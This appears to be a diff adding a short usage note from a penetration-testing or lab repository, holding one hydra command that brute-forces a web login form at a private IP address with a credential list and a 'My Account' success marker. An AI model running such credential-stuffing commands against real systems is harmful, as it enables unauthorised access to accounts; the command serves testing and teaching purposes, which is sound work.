@@ -1,0 +1,3 @@
+#Example how to execute hydra
+
+hydra -C ./resource/cred_list.txt -V -I 10.1.10.58 http-form-post "/user/login?return_url=:username=^USER^&password=^PASS^:S=My Account"
